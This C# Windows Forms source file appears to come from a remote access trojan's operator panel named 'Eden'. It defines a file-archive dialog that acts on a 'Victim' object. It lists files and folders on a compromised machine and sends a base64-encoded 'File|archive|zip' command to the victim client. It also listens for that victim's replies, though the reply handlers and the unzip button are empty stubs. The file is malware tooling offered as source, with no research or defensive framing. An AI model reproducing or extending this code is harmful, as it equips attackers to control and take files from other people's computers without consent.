using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileArchive : Form
    {
        private Victim m_victim { get; set; }
        private List<frmFileMgr.stEntryTag> m_lstEntry { get; set; }
        private bool m_bCompress { get; set; }

        public frmFileArchive(Victim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
        {
            InitializeComponent();

            m_victim = victim;
            m_lstEntry = lstEntry;
            m_bCompress = bCompress;
        }

        private enum enUnzipMethod
        {
            IndividualFolder,
            CurrentFolder,
        }

        private frmFileMgr.stEntryTag fnGetItemTag(ListViewItem item) => (frmFileMgr.stEntryTag)item.Tag;

        private void fnRecv(Client clnt, string szVictimID, string[] asMsg)
        {
            try
            {
                if (!string.Equals(szVictimID, m_victim.m_szID))
                    return;

                if (asMsg[0] == "file" && asMsg[1] == "archive")
                {
                    if (asMsg[2] == "zip")
                    {

                    }
                    else if (asMsg[2] == "unzip")
                    {

                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FileArchive", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnSetup()
        {
            tabControl1.SelectedIndex = m_bCompress ? 0 : 1;

            foreach (var entry in m_lstEntry)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(entry.szFullName));
                item.SubItems.Add("?");
                item.Tag = entry;

                listView1.Items.Add(item);
            }

            textBox1.Text = clsTools.GetFileNameFromDatetime("zip");

            foreach (string szMethod in Enum.GetNames(typeof(enUnzipMethod)))
                comboBox1.Items.Add(szMethod);

            comboBox1.SelectedIndex = 0;

            m_victim.m_clnt.ServerMessageReceived += fnRecv;
        }

        private void frmFileArchive_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                List<string> lsFolder = m_lstEntry.Where(x => x.bDirectory).Select(x => x.szFullName).ToList();
                List<string> lsFile = m_lstEntry.Where(x => !x.bDirectory).Select(x => x.szFullName).ToList();

                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "archive",
                    "zip",
                    string.Join(",", lsFolder.Select(x => EZCrypto.Encoder.stre2b64(x))),
                    string.Join(",", lsFile.Select(x => EZCrypto.Encoder.stre2b64(x))),
                }));
            });
        }

        private void frmFileArchive_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Task.Run(() =>
            {

            });
        }
    }
}
